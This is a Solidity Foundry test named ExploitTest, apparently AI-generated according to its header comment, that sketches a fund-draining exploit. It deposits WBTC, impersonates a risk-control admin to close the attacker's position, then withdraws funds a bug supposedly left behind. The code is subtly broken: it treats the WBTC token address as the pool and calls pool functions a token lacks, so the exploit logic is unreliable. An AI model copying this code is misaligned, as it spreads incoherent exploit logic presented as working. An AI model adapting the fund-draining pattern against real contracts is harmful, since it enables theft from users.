pragma solidity ^0.8.0;

// Ensemble synthesis candidate.
// Selected source model: Gemini.
// Reviewed candidate models: Gemini.

import "forge-std/Test.sol";

interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPool {
    function deposit(address token, uint256 amount) external;
    function withdraw(address token, uint256 amount) external;
    function closePositionByRiskControl(address user) external;
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
    address attacker = address(this);
    address constant riskControlAdmin = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        uint256 wbtcDecimals = 8;
        uint256 initialAttackerBalance = 100 * (10**wbtcDecimals);
        deal(TARGET, attacker, initialAttackerBalance);
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 wbtcDecimals = 8;
        uint256 depositAmount = 10 * (10**wbtcDecimals);

        // 1. Approve the pool to spend our WBTC and deposit
        // The token (WBTC) and the pool (TARGET) are the same address in this scenario.
        ERC20(TARGET).approve(TARGET, depositAmount);
        IPool(TARGET).deposit(TARGET, depositAmount);

        // 2. The riskControl admin closes the attacker's position
        vm.startPrank(riskControlAdmin);
        IPool(TARGET).closePositionByRiskControl(attacker);
        vm.stopPrank();

        // 3. Attacker withdraws the funds that were not cleared due to the bug
        IPool(TARGET).withdraw(TARGET, depositAmount);
    }

    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

